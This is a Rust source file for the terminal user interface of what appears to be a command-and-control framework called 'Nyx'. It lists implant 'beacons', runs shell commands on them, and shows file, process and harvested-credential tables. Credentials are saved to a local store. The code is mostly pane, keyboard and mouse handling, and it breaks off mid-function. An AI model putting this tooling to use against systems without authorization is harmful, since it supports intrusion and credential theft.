//! opencode-style fullscreen TUI.
//!
//! Layout:
//! ```text
//! ┌─ Nyx  [● status]  beacon: 3 active ────────────────────────────┐
//! │                                                                  │
//! │  event stream (scrollable: ↑/↓, PgUp/PgDn)                       │
//! │                                                                  │
//! ├──────────────────────────────────────────────────────────────────┤
//! │  ▌ type a command, or / for menu   (Enter · ↑history · Ctrl+C)  │
//! └──────────────────────────────────────────────────────────────────┘
//! ```
//! - Typing anything that doesn't start with `/` → shell command on the
//!   selected beacon (opencode's "just type" feel).
//! - `/` → meta-command; opens a completion popup above the input box.
//! - `/ls` `/ps` `/creds` → run the underlying shell command, parse the output,
//!   and pop a fullscreen table overlay (q/Esc returns).

use std::collections::HashMap;
use std::io::{self, stdout};
use std::time::{Duration, Instant};

use crossterm::event::{
    self, DisableMouseCapture, EnableMouseCapture, Event, KeyCode, KeyEvent, KeyModifiers,
    MouseButton, MouseEvent, MouseEventKind,
};
use crossterm::execute;
use crossterm::terminal::{
    disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen,
};
use ratatui::backend::CrosstermBackend;
use ratatui::layout::Rect;
use ratatui::widgets::ListState;
use ratatui::Terminal;

use crate::rest::{self, Bridge, Cmd, Level, LogLine, ParseAs, ParsedTable};
use crate::types::{CredEntry, FileEntry, ProcEntry, SessionView};

// Pure input/interaction logic lives in its own module for testability.
mod config;
mod credstore;
mod input;
mod panes;
mod render;
mod session_meta;
mod topology;
use input::{
    apply_scroll, filter_meta, move_popup_selection, parse_sleep_args, popup_submit_target, Input,
    PopupMove, ScrollDir, SleepSpec, META_COMMANDS,
};
use render::render;

/// Max lines kept in the event stream (older dropped).
const STREAM_CAP: usize = 5000;

/// Max entries kept in command history (older dropped). 与 STREAM_CAP 对称，
/// 防止长时间运行（尤其自动化脚本通过 TUI 发大量命令）导致 history 无界增长。
const HISTORY_CAP: usize = 2000;

/// What fullscreen overlay table to show (q/Esc dismisses).
#[derive(Default)]
pub(super) enum Overlay {
    #[default]
    None,
    Files(Vec<FileEntry>),
    Procs(Vec<ProcEntry>),
    Creds(Vec<CredEntry>),
    Audit(Vec<crate::rest::AuditRow>),
    Sessions(ListState),
    /// 全字段会话详情；锚定 session id，render 时从 app.sessions 实时查找。
    /// 本地数据 overlay（无 worker round-trip）：pending/age/ja3/ja4 等
    /// SessionView 里一直有但 Sessions 行列表丢弃的字段都在这展示。
    SessionDetail(String),
    Image(String, usize),
    /// 排队中（未投递）的任务表，来自 `GET /api/tasks`。
    Tasks(Vec<crate::rest::TaskRow>),
    Profile {
        loaded: bool,
        http_get_uri: String,
        http_post_uri: String,
        useragent: String,
    },
    AuditVerify {
        ok: bool,
        broken_at: Option<u64>,
    },
}

impl Overlay {
    fn is_open(&self) -> bool {
        !matches!(self, Overlay::None)
    }
}

// ---- app state -------------------------------------------------------------

pub(super) struct App {
    bridge: Bridge,
    pub(super) connected: bool,
    pub(super) sessions: Vec<SessionView>,
    pub(super) stream: Vec<LogLine>, // event log
    pub(super) stream_offset: usize, // for scrolling (0 = bottom)
    /// 每个 Console 窗格独立的滚动偏移量（0 = pinned to bottom）。
    /// 键为窗格 id；不存在则退回到 stream_offset（全局 fallback，兼容旧逻辑）。
    pub(super) pane_scroll: HashMap<usize, usize>,
    /// 全局命令历史（所有窗格共享）。↑/↓ 导航时每个窗格各自维护一个
    /// `hist_idx`（在 PaneState 里），所以多窗格下切换不会互相污染。
    history: Vec<String>,
    pub(super) overlay: Overlay,
    /// Latest parsed files listing — mirrored from the most recent `/ls` result
    /// so a Files pane view can render it WITHOUT depending on the fullscreen
    /// overlay being open (q/Esc dismisses the overlay but the data persists).
    /// Previously the pane path got hardcoded `Overlay::Files(vec![])`.
    pub(super) files_view: Vec<FileEntry>,
    /// Latest parsed process listing — mirrors `/ps` for the Procs pane view.
    pub(super) procs_view: Vec<ProcEntry>,
    /// Latest parsed credential listing — mirrors `/creds` for the Creds pane.
    pub(super) creds_view: Vec<CredEntry>,
    /// tmux 式窗格树（可递归分割）。
    pub(super) pane_tree: panes::Pane,
    /// 当前焦点叶 id。
    pub(super) focused_pane: usize,
    /// 本地配置（alias 表等），启动时从 ~/.nyx/config.json 加载。
    config: config::Config,
    /// 凭据库（~/.nyx/creds.json），/creds 解析出的凭据自动入库。
    creds: credstore::CredStore,
    /// session 本地元数据（~/.nyx/sessions.json）。
    pub(super) sessions_meta: session_meta::SessionStore,
    /// 每个会话的 age 基线 `(快照时刻, 当时 age_secs)`，用于客户端推算活的 age。
    /// 故意只在工作真发会话列表（签名变化）时更新：基线 = 真实 age 加本地流逝
    /// 秒数，每帧重算不会引入抖动，也不污染 session_signature（后者刻意排除
    /// age_secs 防止 UI 每秒全表重绘）。
    pub(super) age_baseline: HashMap<String, (Instant, u64)>,
    pub(super) tmux_prefix: bool,
    /// prefix 激活时刻（UX-S5）。用于超时自动复位：按 Ctrl+B 后 2s 内未按有效键
    /// 则自动退出 prefix 模式，防止操作员分心后误触改布局。None = 无活跃计时。
    pub(super) prefix_since: Option<Instant>,
    should_quit: bool,
    /// 上一帧的终端尺寸（宽 × 高）。render 每帧更新，handle_key 里 move_focus
    /// 用它替代硬编码的 80×24，保证在任意终端尺寸下焦点移动都能正确找到邻窗格。
    pub(super) last_frame_size: Rect,
    /// 每个窗格的"当前视图 tab"的屏幕 hit region（单个）。render 每帧填充，
    /// click 时查询：点中它就开关该窗格的视图选择器（view picker）。
    /// 之前是 6 个 tab 平铺，多分屏时挤爆；改成 1 个紧凑 tab + 点击弹菜单。
    pub(super) view_tab_rect: HashMap<usize, Rect>,
    /// 视图选择器状态：Some(pane_id, ListState) = 该窗格的 picker 正开着，
    /// None = 关。开窗时 render 在 tab 下方画小 popup 列 6 个视图，点击选择。
    pub(super) view_picker: Option<(usize, ratatui::widgets::ListState)>,
    /// 焦点窗格的屏幕区域（render 每帧记录）。overlay 限制在这个区域内，
    /// 不再全屏遮挡其他窗格——分屏下操作一个窗格不影响另一个可见。
    pub(super) focused_pane_rect: Rect,
    /// Sessions overlay 里每行的屏幕 hit region（render 每帧重建）。
    /// click 精确命中查询用——避免 List widget 滚动偏移导致算术推算失效。
    pub(super) session_row_rects: Vec<Rect>,
    /// 每个窗格 SessionList 视图的行 hit regions（per-pane）。render 每帧重建。
    /// 键 = 窗格 id；值 = 该窗格 session 列表每行的 (Rect, session_id)。
    /// click 点中某行 → 把该窗格的 session 切到对应 beacon。
    pub(super) pane_session_rows: HashMap<usize, Vec<(Rect, String)>>,
    /// 鼠标当前悬停的窗格 id（用于 hover 高亮）。None = 未悬停窗格区域。
    pub(super) hover_pane: Option<usize>,
}

impl App {
    fn new(bridge: Bridge) -> Self {
        Self {
            bridge,
            connected: false,
            sessions: Vec::new(),
            stream: Vec::new(),
            stream_offset: 0,
            pane_scroll: HashMap::new(),
            history: Vec::new(),
            overlay: Overlay::default(),
            files_view: Vec::new(),
            procs_view: Vec::new(),
            creds_view: Vec::new(),
            pane_tree: panes::Pane::single(1),
            focused_pane: 1,
            config: config::Config::load(),
            creds: credstore::CredStore::load(),
            sessions_meta: session_meta::SessionStore::load(),
            age_baseline: HashMap::new(),
            tmux_prefix: false,
            prefix_since: None,
            should_quit: false,
            last_frame_size: Rect::new(0, 0, 80, 24),
            view_tab_rect: HashMap::new(),
            view_picker: None,
            focused_pane_rect: Rect::new(0, 0, 80, 20),
            session_row_rects: Vec::new(),
            pane_session_rows: HashMap::new(),
            hover_pane: None,
        }
    }

    /// 焦点窗格的 PaneState（输入缓冲 + 光标 + popup + 历史游标）。
    /// handle_key / render_input / render_popup 都走这个，每个窗格独立。
    ///
    /// P0-4 安全降级：不再无条件 expect（render 期 panic = 终端卡死在 raw mode）。
    /// 若 focused_pane 因任何原因失效，fallback 到第一个叶；只有树完全空
    /// （真正的不可恢复状态）才 panic。
    fn focused_state(&self) -> &panes::PaneState {
        self.pane_tree
            .leaf_state(self.focused_pane)
            .or_else(|| {
                // focused_pane 失效 → 回退到深度优先第一个叶。
                self.pane_tree
                    .leaves()
                    .first()
                    .and_then(|(id, _)| self.pane_tree.leaf_state(*id))
            })
            .expect("pane_tree has no leaves — App invariant violated")
    }

    fn focused_state_mut(&mut self) -> &mut panes::PaneState {
        // 先校正 focused_pane（若失效则指向第一个叶），再取 mutable 借用。
        if self.pane_tree.leaf_state(self.focused_pane).is_none() {
            if let Some((id, _)) = self.pane_tree.leaves().first() {
                self.focused_pane = *id;
            }
        }
        self.pane_tree
            .leaf_state_mut(self.focused_pane)
            .expect("focused_pane corrected above; tree must have a leaf")
    }

    pub(super) fn current_session(&self) -> Option<&SessionView> {
        self.pane_tree
            .get_session_id(self.focused_pane)
            .and_then(|id| self.sessions.iter().find(|s| s.id == id))
    }

    /// 客户端推算的会话存活秒数。基线 = 最近一次工作线程真发会话列表时的
    /// `(Instant, age_secs)`，加上自此流逝的本地秒数。无基线 → 0。
    ///
    /// 每帧重算不引入抖动：基线只在 session_signature 变化时更新（与
    /// `age_secs` 被刻意排除出 signature 一致），而 age 的秒级递增只体现在
    /// 状态栏/详情 overlay 的单点重绘，不触发会话全表重排。
    pub(super) fn age_for(&self, id: &str) -> u64 {
        match self.age_baseline.get(id) {
            Some((t0, base)) => base.saturating_add(t0.elapsed().as_secs()),
            None => 0,
        }
    }

    fn log(&mut self, text: &str, level: Level) {
        let sid = self.current_session().map(|s| s.id.clone());
        for line in text.lines() {
            self.stream.push(LogLine {
                text: line.to_string(),
                level,
                session_id: sid.clone(),
            });
        }
        if self.stream.len() > STREAM_CAP {
            let drop = self.stream.len() - STREAM_CAP;
            self.stream.drain(..drop);
        }
    }

    /// Drain snapshots from the worker (non-blocking).
    fn poll_worker(&mut self) {
        while let Ok(snap) = self.bridge.snapshots.try_recv() {
            self.connected = snap.connected;
            if !snap.sessions.is_empty() {
                // keep selection valid
                if self.pane_tree.get_session_id(self.focused_pane).is_none() {
                    if let Some(first) = snap.sessions.first() {
                        self.pane_tree
                            .set_session_id(self.focused_pane, Some(first.id.clone()));
                    }
                }
                self.sessions = snap.sessions;
                // Refresh the age baseline for every live session so age_for()
                // stays accurate between worker polls. 基线 = (现在, 服务器报的 age)。
                let now = Instant::now();
                for s in &self.sessions {
                    self.age_baseline.insert(s.id.clone(), (now, s.age_secs));
                }
                // 清理已断开 session 的 baseline（P1-1b）：只保留当前仍活着的会话，
                // 防止长时间运行（beacon 来去）下 age_baseline 无限增长。
                let live: Vec<String> = self.sessions.iter().map(|s| s.id.clone()).collect();
                self.age_baseline
                    .retain(|id, _| live.iter().any(|l| l == id));
            }
            for l in snap.log_lines {
                self.stream.push(l);
            }
            if self.stream.len() > STREAM_CAP {
                let drop = self.stream.len() - STREAM_CAP;
                self.stream.drain(..drop);
            }
            // A parsed table arrived → pop it as the fullscreen overlay AND mirror
            // it into the per-view cache so the in-pane renderers (Ctrl+3/4/5)
            // show real data instead of placeholders. The overlay is dismissible
            // (q/Esc); the cached view data persists so a pane keeps its content
            // after the overlay closes.
            if let Some(table) = snap.parsed {
                self.overlay = match table {
                    ParsedTable::Files(rows) => {
                        if rows.is_empty() {
                            self.log("(no files parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            self.files_view = rows.clone();
                            Overlay::Files(rows)
                        }
                    }
                    ParsedTable::Procs(rows) => {
                        if rows.is_empty() {
                            self.log("(no processes parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            self.procs_view = rows.clone();
                            Overlay::Procs(rows)
                        }
                    }
                    ParsedTable::Creds(rows) => {
                        if rows.is_empty() {
                            self.log("(no credentials parsed)", Level::Warn);
                            Overlay::None
                        } else {
                            // 落盘到凭据库（按 principal+secret+kind 去重）
                            let beacon_id = self.current_session().map(|s| s.id.clone());
                            let added = self.creds.ingest(&rows, beacon_id.as_deref());
                            if let Err(e) = self.creds.save() {
                                self.log(&format!("! save creds: {e}"), Level::Err);
                            }
                            if added > 0 {
                                self.log(
                                    &format!(
                                        "credstore: +{added} new (total {})",
                                        self.creds.entries.len()
                                    ),
                                    Level::Ok,
                                );
                            }
                            self.creds_view = rows.clone();
                            Overlay::Creds(rows)
                        }
                    }
                    ParsedTable::Audit(rows) => {
                        if rows.is_empty() {
                            self.log("(audit log empty)", Level::Warn);
                            Overlay::None
                        } else {
                            Overlay::Audit(rows)
                        }
                    }
                    ParsedTable::Image { path, bytes } => {
                        if path.is_empty() {
                            self.log("(screenshot: no path)", Level::Warn);
                            Overlay::None
                        } else {
                            self.log(
                                &format!("screenshot saved ({} bytes): {}", bytes, path),
                                Level::Ok,
                            );
                            Overlay::Image(path, bytes)
                        }
                    }
                    ParsedTable::Profile {
                        loaded,
                        http_get_uri,
                        http_post_uri,
                        useragent,
                    } => {
                        if !loaded {
                            self.log("(profile: not loaded)", Level::Warn);
                            Overlay::None
                        } else {
                            self.log(
                &format!(
                    "profile: loaded: {loaded} http-get: {http_get_uri} http-post: {http_post_uri} useragent: {useragent}"
                ),
                Level::Info,
            );
                            Overlay::Profile {
                                loaded,
                                http_get_uri,
                                http_post_uri,
                                useragent,
                            }
                        }
                    }
                    ParsedTable::AuditVerify { ok, broken_at } => {
                        if ok {
                            self.log("audit chain: OK", Level::Ok);
                        } else if let Some(b) = broken_at {
                            self.log(&format!("audit chain: BROKEN at seq {b}"), Level::Err);
                        } else {
                            self.log("audit chain: UNKNOWN", Level::Warn);
                        }
                        Overlay::AuditVerify { ok, broken_at }
                    }
                    ParsedTable::Tasks(rows) => {
                        if rows.is_empty() {
                            self.log("(no queued tasks)", Level::Info);
                            Overlay::None
                        } else {
                            Overlay::Tasks(rows)
                        }
                    }
                };
            }
        }
    }

    /// 发命令到 worker。channel 断开（worker panic/退出）时不再静默吞错：
    /// 对操作命令（shell/bof/inject...）反馈到事件流，让操作员知道任务没发出去。
    fn send(&mut self, cmd: Cmd) {
        if self.bridge.cmds.send(cmd).is_err() {
            self.log("! worker channel closed — command dropped", Level::Err);
        }
    }

    fn handle_key(&mut self, key: KeyEvent) {
        // Overlay takes priority when open (q/Esc/jk/Enter to pick sessions).
        if self.overlay.is_open() {
            self.handle_overlay_key(key);
            return;
        }
        // view picker 开着时拦截键盘：↑↓ 导航、Enter 选、Esc/q 关。
        if self.view_picker.is_some() {
            match key.code {
                KeyCode::Char('j') | KeyCode::Down => {
                    if let Some((_, st)) = self.view_picker.as_mut() {
                        let n = panes::PaneView::ALL.len();
                        let i = st.selected().unwrap_or(0);
                        st.select(Some((i + 1) % n));
                    }
                    return;
                }
                KeyCode::Char('k') | KeyCode::Up => {
                    if let Some((_, st)) = self.view_picker.as_mut() {
                        let n = panes::PaneView::ALL.len();
                        let i = st.selected().unwrap_or(0);
                        st.select(Some(i.checked_sub(1).unwrap_or(n - 1)));
                    }
                    return;
                }
                KeyCode::Enter => {
                    if let Some((pane_id, st)) = self.view_picker.take() {
                        if let Some(i) = st.selected() {
                            if let Some(&v) = panes::PaneView::ALL.get(i) {
                                self.pane_tree = self.pane_tree.clone().set_view(pane_id, v);
                            }
                        }
                    }
                    return;
                }
                KeyCode::Char('q') | KeyCode::Esc => {
                    self.view_picker = None;
                    return;
                }
                _ => {}
            }
        }
        // Ctrl+C always quits.
        if key.modifiers.contains(KeyModifiers::CONTROL) && key.code == KeyCode::Char('c') {
            self.should_quit = true;
            return;
        }
        if key.modifiers.contains(KeyModifiers::CONTROL) {
            match key.code {
                KeyCode::Char('l') => {
                    self.stream.clear();
                    return;
                }
                KeyCode::Char('u') => {
                    let st = self.focused_state_mut();
                    st.input.clear();
                    st.cursor = 0;
                    st.popup_open = false;
                    return;
                }
                KeyCode::Char('b') => {
                    self.tmux_prefix = true;
                    self.prefix_since = Some(Instant::now());
                    return;
                }
                _ => {}
            }
        }

        if self.tmux_prefix {
            self.tmux_prefix = false; // Reset immediately after one keystroke
            self.prefix_since = None;
            // Esc 显式取消 prefix（UX-S5）：之前 Esc 落到 _ 分支被静默吞，违反
            // "Esc = 取消" 通用约定。这里虽已复位，补个清晰语义。
            if key.code == KeyCode::Esc {
                return;
            }
            match key.code {
                KeyCode::Char('v') | KeyCode::Char('%') => {
                    let new_id = self.pane_tree.next_id();
                    self.pane_tree = self.pane_tree.clone().split(
                        self.focused_pane,
                        panes::SplitDir::Columns,
                        new_id,
                    );
                    self.focused_pane = new_id;
                    return;
                }
                KeyCode::Char('s') | KeyCode::Char('"') => {
                    let new_id = self.pane_tree.next_id();
                    self.pane_tree = self.pane_tree.clone().split(
                        self.focused_pane,
                        panes::SplitDir::Rows,
                        new_id,
                    );
                    self.focused_pane = new_id;
                    return;
                }
                KeyCode::Char('x') => {
                    let closed = self.focused_pane;
                    // UX-S4：close 前先记下被关叶的屏幕位置，close 后焦点回退到
                    // 几何上最近的剩余叶（通常是它的兄弟），而不是总跳到第一个叶。
                    // 之前 leaves().first() 会让 2×2 布局关右下角后焦点飞到左上。
                    let full = self.last_frame_size;
                    // 算 pane_area（与 render/click 一致：去掉 statusbar 1 行 + input 3 行）
                    let pane_area = ratatui::layout::Rect {
                        x: full.x,
                        y: full.y + 1,
                        width: full.width,
                        height: full.height.saturating_sub(1 + 3),
                    };
                    let before = self.pane_tree.layout(pane_area);
                    let closed_rect = before.iter().find(|(id, _)| *id == closed).map(|(_, r)| *r);
                    self.pane_tree = self.pane_tree.clone().close(closed);
                    // 清理被关窗格的滚动偏移，防止 id 复用时新窗格读到脏偏移（P1-1a）。
                    self.pane_scroll.remove(&closed);
                    let remaining = self.pane_tree.layout(pane_area);
                    self.focused_pane =
                        pick_nearest_leaf(&remaining, closed_rect).unwrap_or_else(|| {
                            self.pane_tree
                                .leaves()
                                .first()
                                .map(|(id, _)| *id)
                                .unwrap_or(1)
                        });
                    return;
                }
                KeyCode::Char('h') | KeyCode::Left => {
                    let full = self.last_frame_size;
                    self.focused_pane =
                        self.pane_tree
                            .move_focus(self.focused_pane, panes::FocusDir::Left, full);
                    return;
                }
                KeyCode::Char('j') | KeyCode::Down => {
                    let full = self.last_frame_size;
                    self.focused_pane =
                        self.pane_tree
                            .move_focus(self.focused_pane, panes::FocusDir::Down, full);
                    return;
                }
                KeyCode::Char('k') | KeyCode::Up => {
                    let full = self.last_frame_size;
                    self.focused_pane =
                        self.pane_tree
                            .move_focus(self.focused_pane, panes::FocusDir::Up, full);
                    return;
                }
                KeyCode::Char('l') | KeyCode::Right => {
                    let full = self.last_frame_size;
                    self.focused_pane =
                        self.pane_tree
                            .move_focus(self.focused_pane, panes::FocusDir::Right, full);
                    return;
                }
                KeyCode::Char(c @ ('1'..='6')) => {
                    if let Some(view) = panes::PaneView::from_index(c as u8 - b'0') {
                        self.pane_tree = self.pane_tree.clone().set_view(self.focused_pane, view);
                    }
                    return;
                }
                // 调整 split ratio（UX-S2）：大写 H/J/K/L 调比例，小写 hjkl 移焦点。
                // H=向左扩（左块变大）、L=向右扩（右块变大）、J=向下扩、K=向上扩。
                // delta 0.05 每次约 5%，连续按可精细调。
                KeyCode::Char('H') => {
                    self.pane_tree.adjust_ratio(self.focused_pane, 0.05);
                    return;
                }
                KeyCode::Char('L') => {
                    self.pane_tree.adjust_ratio(self.focused_pane, -0.05);
                    return;
                }
                KeyCode::Char('K') => {
                    self.pane_tree.adjust_ratio(self.focused_pane, 0.05);
                    return;
                }
                KeyCode::Char('J') => {
                    self.pane_tree.adjust_ratio(self.focused_pane, -0.05);
                    return;
                }
                _ => {
                    // 未命中的 prefix 键不再静默吞（UX-S5）：给操作员反馈，告知
                    // prefix 已消耗但键无效，并列出有效键，降低学习成本。
                    self.log(
                        "! prefix: unknown key (v/s split · x close · hjkl focus · HJKL resize · 1-6 view)",
                        Level::Warn,
                    );
                    return;
                }
            }
        }
        // Scroll keys (work even while typing).
        match key.code {
            KeyCode::PageUp => {
                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
                *off = off.saturating_add(10);
                return;
            }
            KeyCode::PageDown => {
                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
                *off = off.saturating_sub(10);
                return;
            }
            KeyCode::Up if key.modifiers.contains(KeyModifiers::ALT) => {
                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
                *off = off.saturating_add(1);
                return;
            }
            KeyCode::Down if key.modifiers.contains(KeyModifiers::ALT) => {
                let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
                *off = off.saturating_sub(1);
                return;
            }
            _ => {}
        }

        match key.code {
            KeyCode::Enter => {
                // If the popup is open and we can resolve the typed prefix to a
                // command, replace the input with the resolved command name and
                // run it. This makes `/ls<Enter>` and `/s↑<Enter>` both work.
                {
                    let st = self.focused_state_mut();
                    if st.popup_open {
                        if let Some(name) =
                            popup_submit_target(&st.input, st.popup_state.selected())
                        {
                            st.input = name.to_string();
                            st.cursor = st.input.len();
                        }
                    }
                }
                self.submit();
            }
            KeyCode::Esc => {
                let st = self.focused_state_mut();
                st.input.clear();
                st.cursor = 0;
                st.popup_open = false;
            }
            KeyCode::Backspace => {
                let st = self.focused_state_mut();
                if st.cursor > 0 && st.cursor <= st.input.len() {
                    st.input.remove(st.cursor - 1);
                    st.cursor -= 1;
                }
                if st.input.is_empty() || !st.input.starts_with('/') {
                    st.popup_open = false;
                } else {
                    // re-filter + clamp selection as the prefix shrinks
                    let filtered = filter_meta(&st.input);
                    st.popup_state
                        .select(if filtered.is_empty() { None } else { Some(0) });
                }
            }
            // When the popup is open, ↑/↓ navigate the menu (opencode-style);
            // otherwise they walk input history.
            KeyCode::Up if self.focused_state().popup_open => {
                let st = self.focused_state_mut();
                let filtered = filter_meta(&st.input);
                let next =
                    move_popup_selection(filtered.len(), st.popup_state.selected(), PopupMove::Up);
                st.popup_state.select(next);
            }
            KeyCode::Down if self.focused_state().popup_open => {
                let st = self.focused_state_mut();
                let filtered = filter_meta(&st.input);
                let next = move_popup_selection(
                    filtered.len(),
                    st.popup_state.selected(),
                    PopupMove::Down,
                );
                st.popup_state.select(next);
            }
            KeyCode::Up => {
                // input history navigation
                if !self.history.is_empty() {
                    // 先用不可变借用算出 idx + 拷出历史条目，释放 borrow 后
                    // 再拿 focused_state_mut，避免 self.history 与 self.pane_tree
                    // 同时被借的冲突。
                    let (idx, entry) = {
                        let st = self.focused_state();
                        let idx = match st.hist_idx {
                            Some(i) => i.saturating_sub(1),
                            None => self.history.len() - 1,
                        };
                        (idx, self.history[idx].clone())
                    };
                    let st = self.focused_state_mut();
                    st.hist_idx = Some(idx);
                    st.input = entry;
                    st.cursor = st.input.len();
                }
            }
            KeyCode::Down => {
                // 同样先把索引/条目拷出来，再 mutate 焦点窗格。
                let action = {
                    let st = self.focused_state();
                    match st.hist_idx {
                        Some(i) => {
                            let next = i + 1;
                            if next < self.history.len() {
                                Some(HistoryNav::Pick(self.history[next].clone()))
                            } else {
                                Some(HistoryNav::Clear)
                            }
                        }
                        None => None,
                    }
                };
                match action {
                    Some(HistoryNav::Pick(s)) => {
                        let st = self.focused_state_mut();
                        if let Some(i) = st.hist_idx {
                            st.hist_idx = Some(i + 1);
                        }
                        st.input = s;
                        st.cursor = st.input.len();
                    }
                    Some(HistoryNav::Clear) => {
                        let st = self.focused_state_mut();
                        st.hist_idx = None;
                        st.input.clear();
                        st.cursor = 0;
                    }
                    None => {}
                }
            }
            KeyCode::Left => {
                let st = self.focused_state_mut();
                st.cursor = st.cursor.saturating_sub(1);
            }
            KeyCode::Right => {
                let st = self.focused_state_mut();
                st.cursor = (st.cursor + 1).min(st.input.len());
            }
            KeyCode::Tab if self.focused_state().popup_open => {
                // Tab completes to the selected popup entry (still available
                // alongside ↑↓+Enter for users who prefer it).
                let st = self.focused_state_mut();
                let filtered = filter_meta(&st.input);
                if let Some(sel) = st.popup_state.selected() {
                    if let Some(m) = filtered.get(sel) {
                        st.input = format!("{} ", m.name);
                        st.cursor = st.input.len();
                    }
                }
            }
            KeyCode::Char(c) => {
                let st = self.focused_state_mut();
                st.input.insert(st.cursor, c);
                st.cursor += 1;
                if st.input.starts_with('/') {
                    st.popup_open = true;
                    let filtered = filter_meta(&st.input);
                    // keep selection if still valid, else reset to top
                    let keep = st.popup_state.selected().filter(|&i| i < filtered.len());
                    st.popup_state.select(keep.or(if filtered.is_empty() {
                        None
                    } else {
                        Some(0)
                    }));
                } else {
                    st.popup_open = false;
                }
            }
            _ => {}
        }
    }

    fn handle_overlay_key(&mut self, key: KeyEvent) {
        match &mut self.overlay {
            Overlay::Sessions(state) => match key.code {
                KeyCode::Char('j') | KeyCode::Down => {
                    let i = state.selected().unwrap_or(0);
                    if i + 1 < self.sessions.len() {
                        state.select(Some(i + 1));
                    }
                }
                KeyCode::Char('k') | KeyCode::Up => {
                    let i = state.selected().unwrap_or(0);
                    state.select(Some(i.saturating_sub(1)));
                }
                KeyCode::Enter => {
                    if let Some(i) = state.selected() {
                        if let Some(s) = self.sessions.get(i) {
                            self.pane_tree
                                .set_session_id(self.focused_pane, Some(s.id.clone()));
                        }
                        if let Some(s) = self.sessions.get(i) {
                            self.log(&format!("selected beacon {}", short(&s.id)), Level::Ok);
                        }
                    }
                    self.overlay = Overlay::None;
                }
                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
                _ => {}
            },
            Overlay::None => {}
            _ => match key.code {
                KeyCode::Char('q') | KeyCode::Esc => self.overlay = Overlay::None,
                _ => {}
            },
        }
    }

    /// Handle a mouse event. opencode 风格全套鼠标操作：
    /// - 滚轮：滚动焦点窗格内容（原有）
    /// - 左键单击：聚焦窗格 / 点 tab 切视图 / 点 overlay 行选择
    /// - 右键单击：关闭所点窗格（opencode 的 "中键关闭 tab" 等价物，这里关 pane）
    /// - 中键单击：分屏（左右切分所点窗格，快速开新工作区）
    /// - 鼠标移动：更新 hover_pane 供 render 高亮（视觉反馈）
    fn handle_mouse(&mut self, ev: MouseEvent) {
        // 先更新 hover：鼠标在哪格上方。render 用它做 hover 高亮。
        if let Some(id) = self.pane_at(ev.row, ev.column) {
            self.hover_pane = Some(id);
        } else {
            self.hover_pane = None;
        }
        match ev.kind {
            // Wheel / touchpad vertical scroll.
            MouseEventKind::ScrollUp => self.scroll(ScrollDir::Up, 3),
            MouseEventKind::ScrollDown => self.scroll(ScrollDir::Down, 3),
            MouseEventKind::ScrollLeft => self.scroll(ScrollDir::Up, 1),
            MouseEventKind::ScrollRight => self.scroll(ScrollDir::Down, 1),
            // 左键：点击聚焦 / 切 tab / overlay 选择。
            MouseEventKind::Down(MouseButton::Left) => self.click(ev.row, ev.column),
            // 右键：关闭所点窗格（opencode 中键关 tab 的等价，终端中键常用于粘贴，
            // 故用右键关 pane）。
            MouseEventKind::Down(MouseButton::Right) => {
                if let Some(id) = self.pane_at(ev.row, ev.column) {
                    self.close_pane(id);
                }
            }
            // 中键：在所点窗格处左右分屏（快速开新工作区，opencode 无此操作但很顺手）。
            MouseEventKind::Down(MouseButton::Middle) => {
                if let Some(id) = self.pane_at(ev.row, ev.column) {
                    self.split_pane(id, panes::SplitDir::Columns);
                }
            }
            // 鼠标移动：仅更新 hover（已在上面处理），不触发其他。
            MouseEventKind::Moved => {}
            _ => {}
        }
    }

    /// 查屏幕坐标落在哪个窗格里。返回该叶 id，或 None（点击在窗格区外）。
    /// 供右键/中键/hover 共用，避免每个事件都重算 layout。
    fn pane_at(&self, row: u16, col: u16) -> Option<usize> {
        let full = self.last_frame_size;
        if full.height < 8 {
            return None;
        }
        let pane_area = ratatui::layout::Rect {
            x: full.x,
            y: full.y + 1,
            width: full.width,
            height: full.height.saturating_sub(1 + 3),
        };
        let layouts = self.pane_tree.layout(pane_area);
        layouts.iter().find_map(|(id, r)| {
            (col >= r.x && col < r.x + r.width && row >= r.y && row < r.y + r.height).then_some(*id)
        })
    }

    /// 关闭指定窗格（鼠标右键等价 prefix+x）。复用 close 的焦点回退逻辑。
    fn close_pane(&mut self, target: usize) {
        if self.pane_tree.leaf_count() <= 1 {
            return; // 不关最后一个
        }
        let full = self.last_frame_size;
        let pane_area = ratatui::layout::Rect {
            x: full.x,
            y: full.y + 1,
            width: full.width,
            height: full.height.saturating_sub(1 + 3),
        };
        let before = self.pane_tree.layout(pane_area);
        let closed_rect = before.iter().find(|(id, _)| *id == target).map(|(_, r)| *r);
        self.pane_tree = self.pane_tree.clone().close(target);
        self.pane_scroll.remove(&target);
        let remaining = self.pane_tree.layout(pane_area);
        self.focused_pane = pick_nearest_leaf(&remaining, closed_rect).unwrap_or_else(|| {
            self.pane_tree
                .leaves()
                .first()
                .map(|(id, _)| *id)
                .unwrap_or(1)
        });
    }

    /// 在指定窗格处分屏。鼠标中键的快捷操作。
    fn split_pane(&mut self, target: usize, dir: panes::SplitDir) {
        let new_id = self.pane_tree.next_id();
        self.pane_tree = self.pane_tree.clone().split(target, dir, new_id);
        self.focused_pane = new_id;
    }

    /// Move the active scroll surface by `amount` lines in `dir`.
    fn scroll(&mut self, dir: ScrollDir, amount: usize) {
        // 鼠标滚轮滚动焦点 Console 窗格（或全局 stream）。
        let off = self.pane_scroll.entry(self.focused_pane).or_insert(0);
        *off = apply_scroll(*off, dir, amount);
        // 同步全局 stream_offset 保持旧逻辑兼容。
        self.stream_offset = *off;
    }

    /// Handle a left-click at terminal `(row, col)`.
    /// - 若 Sessions overlay 开着且点中行 → 选择该 beacon（原有逻辑）。
    /// - 否则（UX-S6）按坐标反查窗格 layout，点击即聚焦对应窗格，
    ///   对齐 tmux `set -g mouse on` 的点击聚焦行为。之前鼠标能滚但不能点，
    ///   是半残的反而误导。
    fn click(&mut self, row: u16, col: u16) {
        // Sessions overlay：用 session_row_rects 精确命中（render 记录的每行 Rect）。
        // 不再用算术推算——List widget 滚动偏移会让 row→idx 映射失效。
        if let Overlay::Sessions(state) = &mut self.overlay {
            // 用上一帧 render 记录的 hit regions 查命中。
